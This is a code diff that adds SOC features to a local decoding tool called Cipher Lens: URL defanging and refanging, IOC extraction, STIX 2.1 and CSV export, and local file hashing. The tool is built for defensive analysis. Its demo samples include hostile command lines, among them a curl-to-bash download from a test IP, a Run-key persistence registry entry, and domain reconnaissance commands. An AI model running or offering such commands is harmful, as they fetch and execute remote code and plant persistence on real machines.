@@ -168,7 +168,7 @@ button.clr{padding:7px 22px;font-weight:600}
       <div class="col">
         <div class="lbl">INPUT:</div>
         <textarea id="inp" aria-label="Input" spellcheck="false" placeholder="// paste encoded or obfuscated content. Ctrl+Enter to decode"></textarea>
-        <div class="foot"><span id="cnt">0 chars</span><span><button class="lnk" id="bFile">[open file]</button><input type="file" id="file" hidden><button class="lnk" id="bUndo">[undo layer]</button><button class="lnk" id="bClear">[clear]</button></span></div>
+        <div class="foot"><span id="cnt">0 chars</span><span><button class="lnk" id="bFile">[open file / hash]</button><input type="file" id="file" hidden><button class="lnk" id="bUndo">[undo layer]</button><button class="lnk" id="bClear">[clear]</button></span></div>
       </div>
       <button class="swap" id="bSwap" title="Use output as input" aria-label="Use output as input">&#8645;</button>
       <div class="col">
@@ -179,6 +179,10 @@ button.clr{padding:7px 22px;font-weight:600}
     </div>
     <div class="bar actions">
       <button class="pri" id="bAuto">Decode</button>
+      <button id="bDefang" title="Defang URLs in the input for SOC documentation">Defang URLs</button>
+      <button id="bRefang" title="Restore hxxp and [.] in defanged URLs">Refang URLs</button>
+      <button id="bUrlSpace" title="Remove percent-encoded spaces (%20) from URLs">Remove URL spaces</button>
+      <button id="bExtract" title="Extract indicators from the current output">Extract IOCs</button>
       <button id="bReset" class="clr">Clear</button>
       <label class="key" id="encWrap" hidden>Encoding <select id="encSel"></select></label>
       <label class="key">XOR key <input id="key" placeholder="text or 0x41" autocomplete="off"></label>
@@ -186,18 +190,21 @@ button.clr{padding:7px 22px;font-weight:600}
     <div id="chain" class="chips chain"></div>
     <div id="ops" class="chips" role="group" aria-label="Decoders"></div>
   </section>
+  <section class="panel" id="urlPanel" hidden><div class="ph"><h2>URL breakdown</h2><small>Parsed locally; no URL is opened or contacted</small></div><div id="urlParts" class="grp"></div></section>
+  <section class="panel" id="hashPanel" hidden><div class="ph"><h2>Local file hashes</h2><small id="hashName"></small><span class="sp"></span><button class="lnk" id="bHashCopy">[copy hashes]</button></div><pre id="hashOut" style="height:auto;min-height:72px"></pre></section>
   <section class="panel" id="batch" hidden>
     <div class="ph"><h2>Batch results</h2><small id="bstat">Upload a .txt file with one value per line. Click a row to open it above.</small><span class="sp"></span><button class="lnk" id="bAllIoc">[copy all iocs]</button><button class="lnk" id="bCsv">[export csv]</button><button class="lnk" id="bBJson">[export json]</button></div>
+    <div class="bar"><button id="bBatchDefang">Defang list</button><button id="bBatchRefang">Refang list</button><button id="bBatchSpaces">Remove %20</button><button class="lnk" id="bBatchCopy">[copy transformed list]</button></div><pre id="batchTransform" hidden style="height:180px"></pre>
     <div class="tw"><table id="btable"></table></div>
     <h3>Indicators across all values <small>x N = seen in N values, hover for row numbers</small></h3>
     <div id="bagg" class="grp"></div>
   </section>
-  <section class="panel"><div class="ph"><h2>Indicators and suspicious patterns</h2><small>Click any value to copy it</small><span class="sp"></span><span id="risk" class="risk"></span></div><div id="iocs" class="grp"></div></section>
+  <section class="panel"><div class="ph"><h2>Indicators and suspicious patterns</h2><small>Click any value to copy it</small><span class="sp"></span><span id="risk" class="risk"></span><button class="lnk" id="bIocCsv">[export IOC CSV]</button><button class="lnk" id="bStix">[export STIX 2.1]</button></div><div id="iocs" class="grp"></div></section>
   <section class="panel"><div class="ph"><h2>History</h2><small>kept in memory for this tab only</small><span class="sp"></span><button id="bHC">Clear history</button></div><div id="hist" class="hist"></div></section>
   <div class="feat">
     <div><b>Private by design</b><span>All decoding happens in this tab. A strict Content-Security-Policy blocks network requests.</span></div>
     <div><b>Layered decoding</b><span>Detects the encoding and keeps decoding until the content is readable, then lets you step back through each layer.</span></div>
-    <div><b>Investigation ready</b><span>Highlights commands, IPs, URLs and hashes, and exports defanged IOCs and a JSON report.</span></div>
+    <div><b>Investigation ready</b><span>Extract indicators, inspect URL components, hash files locally, and export SOC reports as Markdown, CSV or STIX 2.1.</span></div>
   </div>
 
   <section class="alts" aria-labelledby="altH">
@@ -305,7 +312,7 @@ const RX=[
  {re:/\bHK(?:LM|CU|CR|U|CC|EY_[A-Z_]+)\\[^\s'"<>|]+/g,c:'m',l:'Registry keys'},
  {re:/\b[A-Za-z]:\\(?:[^\s'"<>|\\]+\\)*[^\s'"<>|\\]*/g,c:'m',l:'Windows paths'},
  {re:/\b(?:[a-z0-9-]+\.)+(?:com|net|org|io|ru|cn|xyz|top|info|biz|co|me|tk|cc|onion|su|site|online|app|dev|cloud|pw|ws|to|ly)\b/g,c:'u',l:'Domains'},
- {re:/\b(?:https?|hxxps?|ftp):\/\/[^\s'"<>)\]]+/gi,c:'u',l:'URLs'},
+ {re:/\b(?:https?|hxxps?|ftp):\/\/[^\s'"<>)]+/gi,c:'u',l:'URLs'},
  {re:/\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\[?\.\]?){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g,c:'i',l:'IPv4 addresses'},
  {re:/\b(?:[a-f0-9]{64}|[a-f0-9]{40}|[a-f0-9]{32})\b/gi,c:'h',l:'Hashes (MD5/SHA1/SHA256)'},
  {re:/\b[\w.+-]+@[\w-]+(?:\.[\w-]+)+\b/g,c:'m',l:'Email addresses'}
@@ -333,7 +340,42 @@ function analyze(t){
     html+=esc(t.slice(p))}else html=esc(t);
   return{html,F}}
 const dfk=k=>/^(URLs|IPv4|Domains)/.test(k);
-const defang=v=>v.replace(/^hxxp/i,'hxxp').replace(/^http/i,'hxxp').replace(/\[?\.\]?/g,'[.]');
+function defangToken(token){
+  let value=token.replace(/^https:/i,'hxxps:').replace(/^http:/i,'hxxp:');
+  const m=value.match(/^((?:hxxps?|https?):\/\/)([^/?#]*)/i);
+  let start=0,end=0;
+  if(m){start=m[1].length;end=start+m[2].length}
+  else{
+    const host=value.match(/^(?:www\.)?(?:[a-z0-9-]+(?:\.|\[\.\]))+[a-z]{2,}(?::\d+)?|^(?:\d{1,3}(?:\.|\[\.\])){3}\d{1,3}(?::\d+)?/i);
+    if(!host)return token;
+    end=host[0].length;
+  }
+  const authority=value.slice(start,end);
+  if(!/(?:[a-z0-9-]+(?:\.|\[\.\]))+[a-z]{2,}|(?:\d{1,3}(?:\.|\[\.\])){3}\d{1,3}/i.test(authority))return token;
+  return value.slice(0,start)+authority.replace(/(?<!\[)\.(?!\])/g,'[.]')+value.slice(end);
+}
+function defang(v){
+  return v.replace(/[^\s<>"']+/g,token=>{
+    const lead=(token.match(/^[([{]+/)||[''])[0],trail=(token.match(/[),;.!?\]}]+$/)||[''])[0];
+    const core=token.slice(lead.length,token.length-trail.length);
+    return lead+defangToken(core)+trail;
+  });
+}
+function refang(v){
+  return v.replace(/[^\s<>"']+/g,token=>{
+    const lead=(token.match(/^[([{]+/)||[''])[0],trail=(token.match(/[),;.!?\]}]+$/)||[''])[0];
+    const core=token.slice(lead.length,token.length-trail.length);
+    if(!/^(?:hxxps?:\/\/|https?:\/\/|(?:www\.)?(?:[a-z0-9-]+\[\.\])+[a-z]{2,}|(?:\d{1,3}\[\.\]){3}\d{1,3})/i.test(core))return token;
+    return lead+core.replace(/^hxxps:/i,'https:').replace(/^hxxp:/i,'http:').replace(/\[\.\]/g,'.')+trail;
+  });
+}
+function removeUrlSpaces(v){
+  return v.replace(/[^\s<>"']+/g,token=>{
+    const lead=(token.match(/^[([{]+/)||[''])[0],trail=(token.match(/[),;.!?\]}]+$/)||[''])[0];
+    const core=token.slice(lead.length,token.length-trail.length);
+    return /^(?:(?:hxxps?|https?):\/\/|www\.)/i.test(core)?lead+core.replace(/%20/gi,'')+trail:token;
+  });
+}
 
 let stack=[''],names=['Input'],hist=[],timer;
 const cur=()=>stack[stack.length-1];
@@ -366,7 +408,16 @@ function render(){
   $('#ops').innerHTML=D.map(d=>{const s=dm.get(d.id)||0;return`<button class="op ${s>=.7?'hit':s>0?'maybe':''}" data-id="${d.id}">${esc(d.name)}${s?`<i>${Math.round(s*100)}%</i>`:''}</button>`}).join('');
   const ks=Object.keys(a.F),sus=ks.filter(k=>k[0]=='S'),lv=sus.some(k=>/Credential/.test(k))||sus.length>=3?'HIGH':sus.length?'MEDIUM':'';
   const rk=$('#risk');rk.textContent=lv?'Triage hint: '+lv+' (heuristic, verify in EDR)':'';rk.style.color=lv=='HIGH'?'var(--bad)':'var(--warn)';
-  $('#iocs').innerHTML=ks.length?ks.sort((x,y)=>(y[0]=='S')-(x[0]=='S')).map(k=>`<div><h3 class="${a.F[k].c}">${esc(k)} <small>${a.F[k].v.size}</small></h3><div>${[...a.F[k].v].map(v=>`<code data-c="${esc(v)}">${esc(v.slice(0,160))}</code>`).join('')}</div></div>`).join(''):'<span class="mut">Nothing suspicious found in this layer yet. Decode further or paste more content.</span>'}
+  $('#iocs').innerHTML=ks.length?ks.sort((x,y)=>(y[0]=='S')-(x[0]=='S')).map(k=>`<div><h3 class="${a.F[k].c}">${esc(k)} <small>${a.F[k].v.size}</small></h3><div>${[...a.F[k].v].map(v=>`<code data-c="${esc(v)}">${esc(v.slice(0,160))}</code>`).join('')}</div></div>`).join(''):'<span class="mut">Nothing suspicious found in this layer yet. Decode further or paste more content.</span>';
+  renderUrlParts(a.F,t)}
+function renderUrlParts(F,t){
+  const vals=[...(F.URLs?.v||[]),...(F.Domains?.v||[])];
+  const rows=vals.map(raw=>{try{const clean=refang(raw),u=new URL(/^[a-z][a-z0-9+.-]*:\/\//i.test(clean)?clean:'https://'+clean);
+    return{raw,scheme:u.protocol.replace(':',''),host:u.hostname,port:u.port||'(default)',path:u.pathname||'/',query:u.search||'(none)',fragment:u.hash||'(none)'}
+  }catch{return{raw,error:'Could not parse this value'}}});
+  $('#urlPanel').hidden=!rows.length;
+  $('#urlParts').innerHTML=rows.map(r=>r.error?`<div><code>${esc(r.raw)}</code> <small>${r.error}</small></div>`:`<div><h3><code>${esc(defang(r.raw))}</code></h3><div>Scheme: ${esc(r.scheme)} · Host: ${esc(r.host)} · Port: ${esc(r.port)}<br>Path: ${esc(r.path)} · Query: ${esc(r.query)} · Fragment: ${esc(r.fragment)}</div></div>`).join('');
+}
 function reset(v){stack=[v];names=['Input'];render()}
 function setInput(v){$('#inp').value=v;reset(v)}
 function sample(){
@@ -392,7 +443,41 @@ $('#mDec').onclick=()=>setMode('dec');$('#mEnc').onclick=()=>setMode('enc');$('#
 $('#inp').addEventListener('input',e=>{clearTimeout(timer);timer=setTimeout(()=>reset(e.target.value),150)});
 $('#inp').addEventListener('keydown',e=>{if(e.ctrlKey&&e.key=='Enter'){e.preventDefault();reset($('#inp').value);go()}});
 $('#bAuto').onclick=()=>{if($('#inp').value!==stack[0])reset($('#inp').value);go()};
+$('#bDefang').onclick=()=>{
+  const source=$('#inp').value;
+  if(!source.trim()){toast('Paste a URL or text containing URLs first');return}
+  const result=defang(source);
+  if(result===source){toast('No URLs or domains found to defang');return}
+  stack=[source,result];names=['Input','Defanged for SOC documentation'];render();record();
+};
+function applyUrlAction(fn,label){
+  const source=$('#inp').value;
+  if(!source.trim()){toast('Paste a URL or text containing URLs first');return}
+  const result=fn(source);
+  if(result===source){toast('No matching URL changes found');return}
+  stack=[source,result];names=['Input',label];render();record();
+}
+$('#bRefang').onclick=()=>applyUrlAction(refang,'Refanged URLs');
+$('#bUrlSpace').onclick=()=>applyUrlAction(removeUrlSpaces,'Removed %20 from URLs');
+function extractIocs(text){
+  const F=analyze(text).F,out=[];
+  for(const [type,x] of Object.entries(F))if(type[0]!=='S')for(const value of x.v)out.push({type,value:/^(URLs|IPv4|Domains)/.test(type)?defang(value):value});
+  return out;
+}
+$('#bExtract').onclick=()=>{
+  const items=extractIocs(cur());if(!items.length){toast('No indicators found in this layer');return}
+  const result=[...new Set(items.map(x=>x.value))].join('\n');stack.push(result);names.push('Extracted IOCs');render();record();
+};
 let rows=[];
+function transformBatch(fn,label){
+  if(!$('#inp').value.trim())return toast('Upload a .txt file first');
+  const lines=$('#inp').value.split(/\r?\n/).filter(x=>x.trim()),result=lines.map(fn).join('\n');
+  $('#batchTransform').textContent=result;$('#batchTransform').hidden=false;toast(label+' '+lines.length+' values');
+}
+$('#bBatchDefang').onclick=()=>transformBatch(defang,'Defanged');
+$('#bBatchRefang').onclick=()=>transformBatch(refang,'Refanged');
+$('#bBatchSpaces').onclick=()=>transformBatch(removeUrlSpaces,'Removed %20 from');
+$('#bBatchCopy').onclick=()=>$('#batchTransform').hidden?toast('Transform the list first'):copy($('#batchTransform').textContent);
 async function autoOn(s){const st=[s],nm=['Input'];
   for(let n=0;n<12;n++){const c=detect(st.at(-1))[0];if(!c||c.sc<.7)break;let r;
     try{r=await c.d.run(st.at(-1))}catch{break}
@@ -403,7 +488,7 @@ const riskOf=F=>{const q=Object.keys(F).filter(k=>k[0]=='S');return q.some(k=>/C
 async function batch(){
   const lines=$('#inp').value.split(/\r?\n/).map(x=>x.trim()).filter(Boolean).slice(0,500);
   if(!lines.length){toast('Upload a .txt file first');return}
-  rows=[];
+  rows=[];$('#batchTransform').hidden=true;$('#batchTransform').textContent='';
   for(let i=0;i<lines.length;i++){const{st,nm}=await autoOn(lines[i]),F=analyze(st.at(-1)).F;
     rows.push({n:i+1,input:lines[i],st,nm,F,risk:riskOf(F)});
     if(i%10==9){$('#bstat').textContent=`Analyzing ${i+1}/${lines.length}...`;await new Promise(r=>setTimeout(r))}}
@@ -417,7 +502,7 @@ function renderBatch(){
   const ks=Object.keys(A).sort((x,y)=>(y[0]=='S')-(x[0]=='S'));
   $('#bagg').innerHTML=ks.length?ks.map(k=>`<div><h3 class="${A[k].c}">${esc(k)} <small>${A[k].m.size}</small></h3><div>${[...A[k].m].map(([v,n])=>`<code data-c="${esc(v)}" title="rows: ${n.join(', ')}">${esc(v.slice(0,120))}${n.length>1?' x'+n.length:''}</code>`).join('')}</div></div>`).join(''):'<span class="mut">No indicators found in any value.</span>'}
 const csvCell=v=>{v=String(v);if(/^[=+\-@\t\r]/.test(v))v="'"+v;return '"'+v.replace(/"/g,'""')+'"'};
-function dl(text,type,ext){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([text],{type}));a.download='cipher-lens-batch-'+Date.now()+'.'+ext;a.click();setTimeout(()=>URL.revokeObjectURL(a.href),1e3)}
+function dl(text,type,ext){const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([text],{type}));a.download='cipher-lens-'+Date.now()+'.'+ext;a.click();setTimeout(()=>URL.revokeObjectURL(a.href),1e3)}
 const iocLine=r=>Object.entries(r.F).map(([k,x])=>k+': '+[...x.v].join(' | ')).join(' ; ');
 $('#bCsv').onclick=()=>{if(!rows.length)return toast('Run Analyze all first');
   dl(['row,input,layers,final_output,risk,indicators',...rows.map(r=>[r.n,r.input,r.nm.slice(1).join(' > '),r.st.at(-1),r.risk,iocLine(r)].map(csvCell).join(','))].join('\n'),'text/csv','csv')};
@@ -428,28 +513,63 @@ $('#btable').addEventListener('click',e=>{const t=e.target.closest('tr[data-r]')
   stack=[...r.st];names=[...r.nm];render();$('#btable').querySelectorAll('tr.sel').forEach(x=>x.classList.remove('sel'));t.classList.add('sel');$('#out').scrollIntoView({block:'nearest'})});
 $('#bagg').addEventListener('click',e=>{const c=e.target.closest('[data-c]');if(c)copy(c.dataset.c)});
 const batchSample=()=>[sample(),btoa('nltest /dom_trusts'),Array.from(u8('curl http://203.0.113.9/p.sh | bash'),x=>'%'+x.toString(16).padStart(2,'0')).join(''),h2(u8('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\Users\\Public\\u.exe')),btoa('hello world'),'just a normal sentence'].join('\n');
-function md(){const F=analyze(cur()).F,ks=Object.keys(F),f='```';
-  return '# Cipher Lens report\n\n**Layers:** '+names.join(' > ')+'\n\n**Original input:**\n'+f+'\n'+stack[0]+'\n'+f+'\n\n**Final output:**\n'+f+'\n'+cur()+'\n'+f+'\n\n**Indicators:**\n'+(ks.length?ks.map(k=>'- '+k+': '+[...F[k].v].map(v=>'`'+(k[0]!='S'&&dfk(k)?defang(v):v)+'`').join(', ')).join('\n'):'- none')}
+function md(){const F=analyze(cur()).F,ks=Object.keys(F),f='```',risk=riskOf(F);
+  return '# Cipher Lens SOC report\n\n**Generated:** '+new Date().toISOString()+'  \n**Layers:** '+names.join(' > ')+'  \n**Triage hint:** '+risk+' (heuristic)\n\n**Original input:**\n'+f+'\n'+defang(stack[0])+'\n'+f+'\n\n**Final output:**\n'+f+'\n'+defang(cur())+'\n'+f+'\n\n**Indicators:**\n'+(ks.length?ks.map(k=>'- '+k+': '+[...F[k].v].map(v=>'`'+(k[0]!='S'&&dfk(k)?defang(v):v)+'`').join(', ')).join('\n'):'- none')}
 $('#bMd').onclick=()=>copy(md());
+$('#bIocCsv').onclick=()=>{
+  const items=extractIocs(cur());if(!items.length)return toast('No indicators found');
+  dl(['type,value',...items.map(x=>[x.type,x.value].map(csvCell).join(','))].join('\n'),'text/csv','csv');
+};
+function stixId(){const b=crypto.getRandomValues(new Uint8Array(16));b[6]=(b[6]&15)|64;b[8]=(b[8]&63)|128;const h=[...b].map(x=>x.toString(16).padStart(2,'0')).join('');return h.slice(0,8)+'-'+h.slice(8,12)+'-'+h.slice(12,16)+'-'+h.slice(16,20)+'-'+h.slice(20)}
+$('#bStix').onclick=()=>{
+  const F=analyze(cur()).F,now=new Date().toISOString(),objects=[];
+  const add=(type,value,pattern)=>{const raw=refang(value).replace(/\\/g,'\\\\').replace(/'/g,"\\'");objects.push({type:'indicator',spec_version:'2.1',id:'indicator--'+stixId(),created:now,modified:now,name:type+' indicator',indicator_types:['malicious-activity'],pattern_type:'stix',pattern:pattern.replace('{value}',raw),valid_from:now,confidence:50})};
+  for(const v of F.URLs?.v||[])add('URL',v,"[url:value = '{value}']");
+  for(const v of F.Domains?.v||[])add('domain',v,"[domain-name:value = '{value}']");
+  for(const v of F['IPv4 addresses']?.v||[])add('IPv4',v,"[ipv4-addr:value = '{value}']");
+  for(const v of F['Email addresses']?.v||[])add('email',v,"[email-addr:value = '{value}']");
+  for(const v of F['Hashes (MD5/SHA1/SHA256)']?.v||[]){const alg={32:'MD5',40:'SHA-1',64:'SHA-256'}[v.length];if(alg)add('file hash',v,"[file:hashes.'"+alg+"' = '{value}']")}
+  if(!objects.length)return toast('No STIX-compatible indicators found');
+  dl(JSON.stringify({type:'bundle',id:'bundle--'+stixId(),objects},null,2),'application/stix+json','stix.json');
+};
 $('#bWrap').onclick=()=>{const o=$('#out').classList.toggle('nowrap');$('#bWrap').textContent='[wrap: '+(o?'off':'on')+']'};
+function md5(bytes){
+  const len=bytes.length,paddedLen=Math.ceil((len+9)/64)*64,padded=new Uint8Array(paddedLen);padded.set(bytes);padded[len]=128;
+  const bits=len*8,high=Math.floor(bits/4294967296);for(let i=0;i<4;i++){padded[paddedLen-8+i]=(bits>>>(8*i))&255;padded[paddedLen-4+i]=(high>>>(8*i))&255}
+  const shifts=[7,12,17,22,5,9,14,20,4,11,16,23,6,10,15,21],K=Array.from({length:64},(_,i)=>Math.floor(Math.abs(Math.sin(i+1))*4294967296)>>>0);
+  let a0=0x67452301,b0=0xefcdab89,c0=0x98badcfe,d0=0x10325476;const view=new DataView(padded.buffer);
+  for(let off=0;off<paddedLen;off+=64){let a=a0,b=b0,c=c0,d=d0;
+    for(let i=0;i<64;i++){let f,g,s;if(i<16){f=(b&c)|(~b&d);g=i;s=shifts[i%4]}else if(i<32){f=(d&b)|(~d&c);g=(5*i+1)%16;s=shifts[4+i%4]}else if(i<48){f=b^c^d;g=(3*i+5)%16;s=shifts[8+i%4]}else{f=c^(b|~d);g=(7*i)%16;s=shifts[12+i%4]}
+      const x=(a+f+K[i]+view.getUint32(off+g*4,true))>>>0,rot=((x<<s)|(x>>>(32-s)))>>>0;a=d;d=c;c=b;b=(b+rot)>>>0}
+    a0=(a0+a)>>>0;b0=(b0+b)>>>0;c0=(c0+c)>>>0;d0=(d0+d)>>>0}
+  return[a0,b0,c0,d0].map(n=>[n&255,(n>>>8)&255,(n>>>16)&255,n>>>24].map(x=>x.toString(16).padStart(2,'0')).join('')).join('')
+}
+async function showHashes(file,bytes){
+  $('#hashPanel').hidden=false;$('#hashName').textContent=file.name+' · '+bytes.length.toLocaleString()+' bytes';$('#hashOut').textContent='Calculating locally…';
+  try{const fmt=async alg=>[...new Uint8Array(await crypto.subtle.digest(alg,bytes))].map(x=>x.toString(16).padStart(2,'0')).join('');
+    const values={MD5:md5(bytes),'SHA-1':await fmt('SHA-1'),'SHA-256':await fmt('SHA-256')};
+    $('#hashOut').textContent=Object.entries(values).map(([k,v])=>k+': '+v).join('\n');
+  }catch(e){$('#hashOut').textContent='Hashing failed: '+e.message+' (SHA hashes require a secure browser context).'}
+}
+$('#bHashCopy').onclick=()=>$('#hashOut').textContent.startsWith('MD5:')?copy($('#hashOut').textContent):toast('No hashes ready to copy');
 async function loadFile(f){if(!f)return;
   if(mode=='bat'){
     if(!/\.txt$/i.test(f.name)){toast('Batch mode accepts .txt files only');return}
     if(f.size>2e6){toast('File is over 2 MB');return}
-    const t=b2t(new Uint8Array(await f.arrayBuffer()));
+    const bytes=new Uint8Array(await f.arrayBuffer());await showHashes(f,bytes);const t=b2t(bytes);
     if(printable(t)<.95){toast('That does not look like a text file');return}
     const n=t.split(/\r?\n/).filter(x=>x.trim()).length;
     if(!n){toast('The file is empty');return}
     setInput(t);await batch();if(n>500)toast(`Only the first 500 of ${n} values were analyzed`);return}
   if(f.size>5e6){toast('File is over 5 MB');return}
-  const b=new Uint8Array(await f.arrayBuffer()),t=b2t(b);setInput(printable(t)>.9?t:h2(b));toast('Loaded '+f.name)}
+  const b=new Uint8Array(await f.arrayBuffer());await showHashes(f,b);const t=b2t(b);setInput(printable(t)>.9?t:h2(b));toast('Loaded '+f.name)}
 $('#bFile').onclick=()=>$('#file').click();
 $('#file').onchange=e=>{loadFile(e.target.files[0]);e.target.value=''};
 $('#inp').addEventListener('dragover',e=>e.preventDefault());
 $('#inp').addEventListener('drop',e=>{if(e.dataTransfer.files.length){e.preventDefault();loadFile(e.dataTransfer.files[0])}});
 $('#bSwap').onclick=()=>{if(stack.length<2){toast('Nothing to move yet. Run a decode or encode first.');return}setInput(cur())};
 $('#bUndo').onclick=()=>{if(stack.length>1){stack.pop();names.pop();render()}};
-const clearAll=()=>{if(mode=='bat'){rows=[];renderBatch()}setInput('');$('#inp').focus()};
+const clearAll=()=>{if(mode=='bat'){rows=[];renderBatch();$('#batchTransform').hidden=true;$('#batchTransform').textContent=''}setInput('');$('#inp').focus()};
 $('#bClear').onclick=clearAll;$('#bReset').onclick=clearAll;
 $('#bSample').onclick=()=>{if(mode=='bat'){setInput(batchSample());batch();return}if(mode=='enc'){setInput('whoami /all & net user /domain');return}setInput(sample());auto()};
 $('#bCopy').onclick=()=>copy(cur());
